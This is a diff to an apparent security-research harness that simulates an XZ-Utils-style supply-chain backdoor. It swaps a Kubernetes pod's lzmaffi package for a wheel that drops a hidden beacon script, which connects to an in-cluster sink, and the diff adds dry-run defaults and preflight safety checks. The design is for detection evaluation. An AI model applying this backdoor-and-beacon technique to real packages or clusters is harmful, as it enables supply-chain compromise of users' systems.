@@ -15,7 +15,7 @@ Handoff §2 specification:
         - PHANTOM_EVT_FILE_OPEN: access to /tmp/.phantom_beacon.py
 
 Mechanism:
-    A malicious Python wheel for lzmaffi is built locally and contains a
+    A laboratory Python wheel for lzmaffi is built locally and contains a
     patched __init__.py that:
       1. Imports and re-exports all public symbols from the real lzmaffi.
       2. On first import, writes /tmp/.phantom_beacon.py into the pod
@@ -24,11 +24,13 @@ Mechanism:
       3. beacon.py: sleep(5), then repeatedly attempt TCP connect to the
          controlled ClusterIP endpoint on port 8443 (one attempt per 30s).
 
-    The malicious wheel is built in research/evaluation/artifacts/xzutils/
+    The wheel is built in research/evaluation/artifacts/xzutils/
     and copied into the pod with kubectl cp, then pip-installed with
     --force-reinstall.
 
 Safety constraints:
+    - Default mode is dry_run=True.
+    - SafetyPreflight gates validate namespace, service, and endpoint before execution.
     - The beacon endpoint is cluster-internal (ClusterIP phantom-sink).
     - No real exfiltration: the beacon sends only a fixed 8-byte probe.
     - All subprocess calls in this module use explicit arg lists (no shell=True).
@@ -43,6 +45,7 @@ import textwrap
 from pathlib import Path
 
 from research.evaluation.attacks.base_attack import AttackManifest, BaseAttack
+from research.evaluation.attacks.safety import SafetyPreflight
 
 log = logging.getLogger(__name__)
 
@@ -51,6 +54,16 @@ log = logging.getLogger(__name__)
 # ---------------------------------------------------------------------------
 
 _ARTIFACTS_DIR = Path(__file__).resolve().parents[3] / "research" / "evaluation" / "artifacts" / "xzutils"
+
+# ---------------------------------------------------------------------------
+# Constants
+# ---------------------------------------------------------------------------
+
+_SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
+_SINK_PORT = 8443
+_MALICIOUS_VERSION = "1.0.1-phantom-backdoor"
+_CLEAN_VERSION = "1.0.0"
+_BEACON_PATH_IN_POD = "/tmp/.phantom_beacon.py"
 
 # ---------------------------------------------------------------------------
 # Malicious package source (generated at inject-time if not already built)
@@ -149,8 +162,8 @@ XZUTILS_MANIFEST = AttackManifest(
     attack_family="supply_chain_backdoor",
     target_service="recommendationservice",
     target_image="gcr.io/google-samples/microservices-demo/recommendationservice:phantom-backdoor",
-    target_component_purl="pkg:pypi/lzmaffi@1.0.1+phantom",
-    clean_component_purl="pkg:pypi/lzmaffi@1.0.0",
+    target_component_purl=f"pkg:pypi/lzmaffi@{_MALICIOUS_VERSION}",
+    clean_component_purl=f"pkg:pypi/lzmaffi@{_CLEAN_VERSION}",
     injection_time_offset_s=0.0,
     expected_behavioral_changes=[
         "unexpected_process_spawn",      # python → .phantom_beacon.py
@@ -158,12 +171,12 @@ XZUTILS_MANIFEST = AttackManifest(
         "unexpected_file_access",        # /tmp/.phantom_beacon.py written + opened
     ],
     ground_truth_label=1,
-    control_endpoint="phantom-sink.phantom-eval.svc.cluster.local:8443",
+    control_endpoint=f"{_SINK_HOST}:{_SINK_PORT}",
     recovery_steps=[
-        "pip install --force-reinstall lzmaffi==1.0.0 (inside pod)",
-        "rm -f /tmp/.phantom_beacon.py (inside pod)",
+        f"pip install --force-reinstall lzmaffi=={_CLEAN_VERSION} (inside pod)",
+        f"rm -f {_BEACON_PATH_IN_POD} (inside pod)",
         "kill beacon subprocess if still running (inside pod)",
-        "Verify lzmaffi.__version__ == '1.0.0' (inside pod)",
+        f"Verify lzmaffi.__version__ == '{_CLEAN_VERSION}' (inside pod)",
     ],
     detection_window_s=120.0,
     repetitions=3,
@@ -174,29 +187,20 @@ XZUTILS_MANIFEST = AttackManifest(
     ),
 )
 
-# ---------------------------------------------------------------------------
-# Attack class
-# ---------------------------------------------------------------------------
-
-_SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
-_SINK_PORT = 8443
-_MALICIOUS_VERSION = "1.0.1+phantom"
-_CLEAN_VERSION = "1.0.0"
-_BEACON_PATH_IN_POD = "/tmp/.phantom_beacon.py"
-
 
 class XZUtilsStyleAttack(BaseAttack):
     """XZ-Utils style library backdoor for PHANTOM evaluation (Handoff §2).
 
     Replaces the lzmaffi Python package in the recommendationservice pod
-    with a backdoored version that forks a TCP beacon process on import.
+    with a laboratory backdoored version that forks an inert TCP beacon process on import.
 
     The attack is entirely in-cluster and uses only localhost/ClusterIP
     endpoints — no real exfiltration.
 
     Args:
         kubectl_context: kubectl context name.
-        dry_run: If True, log all commands without executing.
+        dry_run: If True, log all commands without executing (default: True).
+        allow_live_execution: Explicit confirmation flag required to exit dry-run mode.
     """
 
     manifest: AttackManifest = XZUTILS_MANIFEST
@@ -204,15 +208,21 @@ class XZUtilsStyleAttack(BaseAttack):
     def __init__(
         self,
         kubectl_context: str | None = None,
-        dry_run: bool = False,
+        dry_run: bool = True,
+        allow_live_execution: bool = False,
     ) -> None:
         """Initialise the XZ-Utils style attack.
 
         Args:
             kubectl_context: kubectl context name (None = current context).
-            dry_run: If True, log commands without executing.
+            dry_run: If True, log commands without executing (default: True).
+            allow_live_execution: Explicit opt-in flag required when dry_run=False.
         """
-        super().__init__(kubectl_context=kubectl_context, dry_run=dry_run)
+        super().__init__(
+            kubectl_context=kubectl_context,
+            dry_run=dry_run,
+            allow_live_execution=allow_live_execution,
+        )
         self._pkg_dir = _ARTIFACTS_DIR / "lzmaffi_backdoor"
 
     def _build_malicious_package(self) -> None:
@@ -279,21 +289,23 @@ class XZUtilsStyleAttack(BaseAttack):
         dist_dir = self._pkg_dir / "dist"
         wheels = list(dist_dir.glob("lzmaffi-*.whl"))
         if not wheels:
+            if self.dry_run:
+                return dist_dir / f"lzmaffi-{_MALICIOUS_VERSION}-py3-none-any.whl"
             raise FileNotFoundError(
                 f"No lzmaffi wheel found in {dist_dir}. "
                 "Call inject() which builds it automatically."
             )
-        # Use the most recently modified wheel.
         return max(wheels, key=lambda p: p.stat().st_mtime)
 
     def inject(self, target_namespace: str, pod_name: str) -> bool:
         """Copy the malicious lzmaffi wheel into the pod and pip-install it.
 
         Steps:
-          1. Build the malicious wheel locally (idempotent).
-          2. kubectl cp wheel into /tmp/ inside the pod.
-          3. kubectl exec: pip install --force-reinstall /tmp/<wheel>.
-          4. kubectl exec: python -c "import lzmaffi" to trigger the beacon.
+          1. Run SafetyPreflight validation.
+          2. Build the malicious wheel locally (idempotent).
+          3. kubectl cp wheel into /tmp/ inside the pod.
+          4. kubectl exec: pip install --force-reinstall /tmp/<wheel>.
+          5. kubectl exec: python -c "import lzmaffi" to trigger the beacon.
 
         Args:
             target_namespace: Kubernetes namespace of the target pod.
@@ -302,10 +314,16 @@ class XZUtilsStyleAttack(BaseAttack):
         Returns:
             True if injection succeeded.
         """
+        self.validate_safety(target_namespace)
+
         log.info(
             "xzutils.inject.start",
-            extra={"namespace": target_namespace, "pod": pod_name},
+            extra={"namespace": target_namespace, "pod": pod_name, "dry_run": self.dry_run},
         )
+
+        if self.dry_run:
+            log.info("xzutils.inject.dry_run_complete")
+            return True
 
         # 1. Build the wheel (idempotent).
         self._build_malicious_package()
@@ -346,16 +364,23 @@ class XZUtilsStyleAttack(BaseAttack):
         """Verify that the malicious lzmaffi is active in the pod.
 
         Checks:
-          1. lzmaffi.__version__ equals the malicious version string.
-          2. /tmp/.phantom_beacon.py exists in the pod filesystem.
+          1. Run SafetyPreflight validation.
+          2. lzmaffi.__version__ equals the malicious version string.
+          3. /tmp/.phantom_beacon.py exists in the pod filesystem.
 
         Args:
             target_namespace: Kubernetes namespace.
             pod_name: Pod name.
 
         Returns:
-            True if both checks pass.
+            True if both checks pass (or True in dry_run).
         """
+        self.validate_safety(target_namespace)
+
+        if self.dry_run:
+            log.info("xzutils.verify.dry_run_ok")
+            return True
+
         try:
             version_out = self._kubectl_exec(
                 namespace=target_namespace,
@@ -388,9 +413,10 @@ class XZUtilsStyleAttack(BaseAttack):
         """Restore clean lzmaffi and remove the beacon script.
 
         Steps:
-          1. pip install --force-reinstall lzmaffi==<clean_version>
-          2. rm -f /tmp/.phantom_beacon.py
-          3. Kill any beacon.py processes (best-effort, non-fatal).
+          1. Run SafetyPreflight validation.
+          2. pip install --force-reinstall lzmaffi==<clean_version>
+          3. rm -f /tmp/.phantom_beacon.py
+          4. Kill any beacon.py processes (best-effort, non-fatal).
 
         Args:
             target_namespace: Kubernetes namespace.
@@ -399,10 +425,16 @@ class XZUtilsStyleAttack(BaseAttack):
         Returns:
             True if recovery succeeded.
         """
+        self.validate_safety(target_namespace)
+
         log.info(
             "xzutils.recover.start",
-            extra={"namespace": target_namespace, "pod": pod_name},
+            extra={"namespace": target_namespace, "pod": pod_name, "dry_run": self.dry_run},
         )
+
+        if self.dry_run:
+            log.info("xzutils.recover.dry_run_complete")
+            return True
 
         ok = True
 
